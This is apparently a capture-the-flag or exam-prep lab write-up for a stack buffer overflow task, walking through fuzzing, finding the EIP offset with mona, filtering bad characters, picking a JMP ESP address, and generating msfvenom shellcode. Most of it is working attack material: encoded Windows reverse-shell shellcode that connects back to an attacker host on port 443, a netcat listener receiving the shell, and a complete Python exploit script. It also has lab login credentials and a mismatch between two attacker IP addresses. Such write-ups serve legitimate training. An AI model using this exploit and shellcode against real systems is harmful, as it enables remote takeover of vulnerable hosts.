# Buffer Overflow (Task 5)
## Table of Contents 
* [Fuzz the App](#fuzz-the-app)
* [Find the EIP Register](#find-the-eip-register)
* [Identify Bad Characters](#identify-bad-characters)
* [Find a JMP Instruction](#find-a-jmp-instruction)
* [Generate a Payload](#generate-a-payload)
* [Send the Exploit](#send-the-exploit)
  * [Exploit](#exploit)

## Fuzz the App
```bash
USER=admin
PASS=password
TARGET=10.10.194.204
```
```bash
xfreerdp /u:$USER /p:$PASS /cert:ignore /workarea /v:$TARGET
```
```bash
cd exploits
vim fuzzer.py # update the IP variable
python fuzzer.py

# output
[*] Fuzzing: 10.10.194.204
[+] Sent: 100 bytes
[+] Sent: 200 bytes
[+] Sent: 300 bytes
[+] Sent: 400 bytes
[!] Failed to connect.
```

## Find the EIP Register
```bash
msf-pattern_create -l 800

# output
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba
```

```bash
# restart the app first
vim exploit.py # PAYLOAD: (output above)
python exploit.py

# output
[*] Attacking: 10.10.194.204
[+] Sent exploit.
```

```bash
!mona findmsp -distance 800

# output
0BADF00D   [+] Command used:
0BADF00D   !mona findmsp -distance 800
0BADF00D   [+] Looking for cyclic pattern in memory
0BADF00D       Cyclic pattern (normal) found at 0x008a394a (length 800 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x008a4d7a (length 800 bytes)
0BADF00D       Cyclic pattern (normal) found at 0x0197f8f2 (length 800 bytes)
0BADF00D   [+] Examining registers
0BADF00D       EIP contains normal pattern : 0x356b4134 (offset 314) # <-- LOOK AT THIS
0BADF00D       ESP (0x0197fa30) points at offset 318 in normal pattern (length 482)
0BADF00D       EBP contains normal pattern : 0x6b41336b (offset 310)
0BADF00D       EBX contains normal pattern : 0x41326b41 (offset 306)
0BADF00D   [+] Examining SEH chain
0BADF00D   [+] Examining stack (+- 800 bytes) - looking for cyclic pattern
0BADF00D       Walking stack from 0x0197f710 to 0x0197fd54 (0x00000644 bytes)
0BADF00D       0x0197f8f4 : Contains normal cyclic pattern at ESP-0x13c (-316) : offset 2, length 798 (-> 0x0197fc11 : ESP+0x1e2)
0BADF00D   [+] Examining stack (+- 800 bytes) - looking for pointers to cyclic pattern
0BADF00D       Walking stack from 0x0197f710 to 0x0197fd54 (0x00000644 bytes)
0BADF00D       0x0197f890 : Pointer into normal cyclic pattern at ESP-0x1a0 (-416) : 0x0197f974 : offset 130, length 670
0BADF00D       0x0197f8c4 : Pointer into normal cyclic pattern at ESP-0x16c (-364) : 0x0197f924 : offset 50, length 750
0BADF00D   [+] Preparing output file 'findmsp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\findmsp.txt
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:01.638000
```

## Identify Bad Characters
```bash
bytearray 

# output
\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
```

```bash
# restart the app first
vim exploit.py # OFFSET: 314, PAYLOAD: (output above), RETN: "BBBB"
python exploit.py

# output
[*] Attacking: 10.10.194.204
[+] Sent exploit.
```

```bash
!mona config -set workingfolder c:\mona\%p

# output
0BADF00D   [+] Command used:
0BADF00D   !mona config -set workingfolder c:\mona\%p
0BADF00D   Writing value to configuration file
0BADF00D   Old value of parameter workingfolder =
0BADF00D   [+] Creating config file, setting parameter workingfolder
0BADF00D   New value of parameter workingfolder =  c:\mona\%p
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00
```

```bash
!mona bytearray -b "\x00"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona bytearray -b "\x00"
0BADF00D    *** Note: parameter -b has been deprecated and replaced with -cpb ***
0BADF00D   Generating table, excluding 1 bad chars...
0BADF00D   Dumping table to file
0BADF00D   [+] Preparing output file 'bytearray.txt'
0BADF00D       - Creating working folder c:\mona\oscp
0BADF00D       - Folder created
0BADF00D       - (Re)setting logfile c:\mona\oscp\bytearray.txt
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
0BADF00D
0BADF00D   Done, wrote 255 bytes to file c:\mona\oscp\bytearray.txt
0BADF00D   Binary output saved in c:\mona\oscp\bytearray.bin
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.016000
```

```bash
!mona compare -f C:\mona\oscp\bytearray.bin -a 018AFA30

# output
mona Memory comparison results
Address                    Status                     BadChars                   Type                       Location
0x018afa30                 Corruption after 21 bytes  00 16 17 2f 30 f4 f5 fd    normal                     Stack
```

```bash
# repeat until Status = Unmodified: start app, exploit, generate a new byte array, compare to ESP

# ESP     , BADCHARS
# 018AFA30, "\x00\x16\x2f\xf4\xfd"

vim exploit.py # BADCHARS = "\x00\x16\x2f\xf4\xfd"
```

## Find a JMP Instruction
```bash
!mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"

# output
0BADF00D   [+] Command used:
0BADF00D   !mona jmp -r esp -cpb "\x00\x16\x2f\xf4\xfd"

           ---------- Mona command started on 2021-08-27 22:36:04 (v2.0, rev 605) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Bad char filter will be applied to pointers : "\x00\x16\x2f\xf4\xfd"
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 2 modules
0BADF00D       - Querying module essfunc.dll
0BADF00D       - Querying module oscp.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile c:\mona\oscp\jmp.txt
0BADF00D   [+] Writing results to c:\mona\oscp\jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 9
0BADF00D   [+] Results :
625011AF     0x625011af : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False... # <--- USING THIS ONE
625011BB     0x625011bb : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
625011C7     0x625011c7 : jmp esp |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False...
# ...snipped...
0BADF00D       Found a total of 9 pointers
0BADF00D
0BADF00D   [+] This mona.py action took 0:00:00.312000
```

```bash
# ADDRESS: "\x62\x50\x11\xaf" # address of JMP instruction
# RETN: "\xaf\x11\x50\x62" # address of JMP instrucion, in Little Endian
```

## Generate a Payload

USE YOUR IP ADDRESS FOR THE LHOST!
```bash
ip address
LHOST=10.8.224.117 # change me
BADCHARS="\x00\x16\x2f\xf4\xfd" # change me
msfvenom -p windows/shell_reverse_tcp LHOST=10.8.224.177 LPORT=443 -f python -v PAYLOAD EXITFUNC=thread -b "\x00\x16\x2f\xf4\xfd"

# output
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with Failed to locate a valid permutation.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor failed with Encoding failed due to a bad character (index=23, char=0xf4)
Attempting to encode payload with 1 iterations of x86/countdown
x86/countdown failed with Encoding failed due to a bad character (index=43, char=0x16)
Attempting to encode payload with 1 iterations of x86/fnstenv_mov
x86/fnstenv_mov failed with Encoding failed due to a bad character (index=8, char=0xf4)
Attempting to encode payload with 1 iterations of x86/jmp_call_additive
x86/jmp_call_additive succeeded with size 353 (iteration=0)
x86/jmp_call_additive chosen with final size 353
Payload size: 353 bytes
Final size of python file: 1877 bytes
PAYLOAD =  b""
PAYLOAD += b"\xfc\xbb\x55\x97\xd4\x8f\xeb\x0c\x5e\x56\x31\x1e"
PAYLOAD += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
PAYLOAD += b"\xff\xa9\x7f\x56\x8f\x51\x80\x37\x19\xb4\xb1\x77"
PAYLOAD += b"\x7d\xbd\xe2\x47\xf5\x93\x0e\x23\x5b\x07\x84\x41"
PAYLOAD += b"\x74\x28\x2d\xef\xa2\x07\xae\x5c\x96\x06\x2c\x9f"
PAYLOAD += b"\xcb\xe8\x0d\x50\x1e\xe9\x4a\x8d\xd3\xbb\x03\xd9"
PAYLOAD += b"\x46\x2b\x27\x97\x5a\xc0\x7b\x39\xdb\x35\xcb\x38"
PAYLOAD += b"\xca\xe8\x47\x63\xcc\x0b\x8b\x1f\x45\x13\xc8\x1a"
PAYLOAD += b"\x1f\xa8\x3a\xd0\x9e\x78\x73\x19\x0c\x45\xbb\xe8"
PAYLOAD += b"\x4c\x82\x7c\x13\x3b\xfa\x7e\xae\x3c\x39\xfc\x74"
PAYLOAD += b"\xc8\xd9\xa6\xff\x6a\x05\x56\xd3\xed\xce\x54\x98"
PAYLOAD += b"\x7a\x88\x78\x1f\xae\xa3\x85\x94\x51\x63\x0c\xee"
PAYLOAD += b"\x75\xa7\x54\xb4\x14\xfe\x30\x1b\x28\xe0\x9a\xc4"
PAYLOAD += b"\x8c\x6b\x36\x10\xbd\x36\x5f\xd5\x8c\xc8\x9f\x71"
PAYLOAD += b"\x86\xbb\xad\xde\x3c\x53\x9e\x97\x9a\xa4\xe1\x8d"
PAYLOAD += b"\x5b\x3a\x1c\x2e\x9c\x13\xdb\x7a\xcc\x0b\xca\x02"
PAYLOAD += b"\x87\xcb\xf3\xd6\x08\x9b\x5b\x89\xe8\x4b\x1c\x79"
PAYLOAD += b"\x81\x81\x93\xa6\xb1\xaa\x79\xcf\x58\x51\xea\xfa"
PAYLOAD += b"\x94\xb9\x5b\x92\xa6\x39\x9d\xd8\x2e\xdf\xf7\x0e"
PAYLOAD += b"\x67\x48\x60\xb6\x22\x02\x11\x37\xf9\x6f\x11\xb3"
PAYLOAD += b"\x0e\x90\xdc\x34\x7a\x82\x89\xb4\x31\xf8\x1c\xca"
PAYLOAD += b"\xef\x94\xc3\x59\x74\x64\x8d\x41\x23\x33\xda\xb4"
PAYLOAD += b"\x3a\xd1\xf6\xef\x94\xc7\x0a\x69\xde\x43\xd1\x4a"
PAYLOAD += b"\xe1\x4a\x94\xf7\xc5\x5c\x60\xf7\x41\x08\x3c\xae"
PAYLOAD += b"\x1f\xe6\xfa\x18\xee\x50\x55\xf6\xb8\x34\x20\x34"
PAYLOAD += b"\x7b\x42\x2d\x11\x0d\xaa\x9c\xcc\x48\xd5\x11\x99"
PAYLOAD += b"\x5c\xae\x4f\x39\xa2\x65\xd4\x59\x41\xaf\x21\xf2"
PAYLOAD += b"\xdc\x3a\x88\x9f\xde\x91\xcf\x99\x5c\x13\xb0\x5d"
PAYLOAD += b"\x7c\x56\xb5\x1a\x3a\x8b\xc7\x33\xaf\xab\x74\x33"
PAYLOAD += b"\xfa\xab\x7a\xcb\x05"
```

## Send the Exploit
```bash
# restart the app first
vim exploit.py # RETN: (address of JMP instruction found), PAYLOAD: (output above), PADDING: "\x90" * 16
python exploit.py

# output
[*] Attacking: 10.10.194.204
[+] Sent exploit.
```

```bash
sudo nc -nvlp 443

# output
listening on [any] 443 ...
connect to [10.8.224.177] from (UNKNOWN) [10.10.194.204] 49267
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\admin\Desktop\vulnerable-apps\oscp>
```

## Exploit
```python
#!/usr/bin/env python3

import socket

IP = "10.10.194.204" # change me
PORT = 1337 # change me
TARGET = (IP,PORT)
PREFIX = "OVERFLOW5 " # change me; vulnerable function of target
OFFSET = 314 # change me; fuzz the target to determine the correct value
OVERFLOW = "A" * OFFSET # bogus chars that will preceed the 
RETN = "\xaf\x11\x50\x62" # address of a JMP instruction, in Little Endian
PADDING = "\x90" * 16 # so the msfvenom encoder does not overwrite itself
BADCHARS = "\x00\x16\x2f\xf4\xfd" # exclude these from your shellcode
PAYLOAD =  b""
PAYLOAD += b"\xfc\xbb\x55\x97\xd4\x8f\xeb\x0c\x5e\x56\x31\x1e"
PAYLOAD += b"\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef\xff\xff"
PAYLOAD += b"\xff\xa9\x7f\x56\x8f\x51\x80\x37\x19\xb4\xb1\x77"
PAYLOAD += b"\x7d\xbd\xe2\x47\xf5\x93\x0e\x23\x5b\x07\x84\x41"
PAYLOAD += b"\x74\x28\x2d\xef\xa2\x07\xae\x5c\x96\x06\x2c\x9f"
PAYLOAD += b"\xcb\xe8\x0d\x50\x1e\xe9\x4a\x8d\xd3\xbb\x03\xd9"
PAYLOAD += b"\x46\x2b\x27\x97\x5a\xc0\x7b\x39\xdb\x35\xcb\x38"
PAYLOAD += b"\xca\xe8\x47\x63\xcc\x0b\x8b\x1f\x45\x13\xc8\x1a"
PAYLOAD += b"\x1f\xa8\x3a\xd0\x9e\x78\x73\x19\x0c\x45\xbb\xe8"
PAYLOAD += b"\x4c\x82\x7c\x13\x3b\xfa\x7e\xae\x3c\x39\xfc\x74"
PAYLOAD += b"\xc8\xd9\xa6\xff\x6a\x05\x56\xd3\xed\xce\x54\x98"
PAYLOAD += b"\x7a\x88\x78\x1f\xae\xa3\x85\x94\x51\x63\x0c\xee"
PAYLOAD += b"\x75\xa7\x54\xb4\x14\xfe\x30\x1b\x28\xe0\x9a\xc4"
PAYLOAD += b"\x8c\x6b\x36\x10\xbd\x36\x5f\xd5\x8c\xc8\x9f\x71"
PAYLOAD += b"\x86\xbb\xad\xde\x3c\x53\x9e\x97\x9a\xa4\xe1\x8d"
PAYLOAD += b"\x5b\x3a\x1c\x2e\x9c\x13\xdb\x7a\xcc\x0b\xca\x02"
PAYLOAD += b"\x87\xcb\xf3\xd6\x08\x9b\x5b\x89\xe8\x4b\x1c\x79"
PAYLOAD += b"\x81\x81\x93\xa6\xb1\xaa\x79\xcf\x58\x51\xea\xfa"
PAYLOAD += b"\x94\xb9\x5b\x92\xa6\x39\x9d\xd8\x2e\xdf\xf7\x0e"
PAYLOAD += b"\x67\x48\x60\xb6\x22\x02\x11\x37\xf9\x6f\x11\xb3"
PAYLOAD += b"\x0e\x90\xdc\x34\x7a\x82\x89\xb4\x31\xf8\x1c\xca"
PAYLOAD += b"\xef\x94\xc3\x59\x74\x64\x8d\x41\x23\x33\xda\xb4"
PAYLOAD += b"\x3a\xd1\xf6\xef\x94\xc7\x0a\x69\xde\x43\xd1\x4a"
PAYLOAD += b"\xe1\x4a\x94\xf7\xc5\x5c\x60\xf7\x41\x08\x3c\xae"
PAYLOAD += b"\x1f\xe6\xfa\x18\xee\x50\x55\xf6\xb8\x34\x20\x34"
PAYLOAD += b"\x7b\x42\x2d\x11\x0d\xaa\x9c\xcc\x48\xd5\x11\x99"
PAYLOAD += b"\x5c\xae\x4f\x39\xa2\x65\xd4\x59\x41\xaf\x21\xf2"
PAYLOAD += b"\xdc\x3a\x88\x9f\xde\x91\xcf\x99\x5c\x13\xb0\x5d"
PAYLOAD += b"\x7c\x56\xb5\x1a\x3a\x8b\xc7\x33\xaf\xab\x74\x33"
PAYLOAD += b"\xfa\xab\x7a\xcb\x05"
SUFFIX = "" 
EXPLOIT = PREFIX + OVERFLOW + RETN + PADDING + PAYLOAD + SUFFIX

print("[*] Attacking: %s" % IP)
try:
    CLIENT = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    CLIENT.settimeout(3)
    CLIENT.connect(TARGET)
    CLIENT.send(EXPLOIT)
    CLIENT.recv(1024)
    CLIENT.close()
    print("[+] Sent exploit.")
except socket.error as ERROR:
    print("[!] Failed to connect.")
    exit()
```
